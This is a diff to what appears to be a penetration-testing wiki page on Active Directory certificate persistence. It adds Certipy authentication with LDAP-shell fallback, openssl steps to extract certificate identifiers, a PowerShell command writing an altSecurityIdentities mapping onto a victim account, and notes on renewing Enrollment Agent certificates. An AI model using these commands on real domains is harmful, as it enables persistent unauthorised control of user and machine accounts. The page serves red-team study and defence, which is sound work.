@@ -94,11 +94,33 @@ Then authenticate with your PFX. Certipy will obtain a TGT directly:
 
 ```bash
 certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10
+
+# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
+certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
+```
+
+### Building Strong `altSecurityIdentities` Mappings
+
+In practice, **Issuer+Serial** and **SKI** mappings are the easiest strong formats to build from an attacker-held certificate. This matters after **February 11, 2025**, when DCs default to **Full Enforcement** and weak mappings stop being reliable.
+
+```bash
+# Extract issuer, serial and SKI from a cert/PFX
+openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
+openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
+```
+
+```powershell
+# Example strong SKI mapping for a user or computer object
+$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
+Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
+# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
 ```
 
 Notes
-- Use strong mapping types only: X509IssuerSerialNumber, X509SKI, or X509SHA1PublicKey. Weak formats (Subject/Issuer, Subject-only, RFC822 email) are deprecated and can be blocked by DC policy.
+- Use strong mapping types only: `X509IssuerSerialNumber`, `X509SKI`, or `X509SHA1PublicKey`. Weak formats (Subject/Issuer, Subject-only, RFC822 email) are deprecated and can be blocked by DC policy.
+- The mapping works on both **user** and **computer** objects, so write access to a computer account's `altSecurityIdentities` is enough to persist as that machine.
 - The cert chain must build to a root trusted by the DC. Enterprise CAs in NTAuth are typically trusted; some environments also trust public CAs.
+- Schannel authentication remains useful for persistence even when PKINIT fails because the DC lacks the Smart Card Logon EKU or returns `KDC_ERR_PADATA_TYPE_NOSUPP`.
 
 For more on weak explicit mappings and attack paths, see:
 
@@ -126,6 +148,10 @@ certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
 
 Revocation of the agent certificate or template permissions is required to evict this persistence.
 
+Operational notes
+- Modern `Certipy` versions support both `-on-behalf-of` and `-renew`, so an attacker holding an Enrollment Agent PFX can mint and later renew leaf certificates without re-touching the original target account.
+- If PKINIT-based TGT retrieval is not possible, the resulting on-behalf-of certificate is still usable for Schannel authentication with `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.
+
 ## 2025 Strong Certificate Mapping Enforcement: Impact on Persistence
 
 Microsoft KB5014754 introduced Strong Certificate Mapping Enforcement on domain controllers. Since February 11, 2025, DCs default to Full Enforcement, rejecting weak/ambiguous mappings. Practical implications:
@@ -141,7 +167,11 @@ Administrators should monitor and alert on:
 
 - Microsoft. KB5014754: Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings).
   https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
+- SpecterOps. ADCS ESC14 Abuse Technique (explicit `altSecurityIdentities` abuse on user/computer objects).
+  https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/
 - Certipy Wiki – Command Reference (`req -renew`, `auth`, `shadow`).
   https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
+- Almond Offensive Security. Authenticating with certificates when PKINIT is not supported.
+  https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html
 
 {{#include ../../../banners/hacktricks-training.md}}
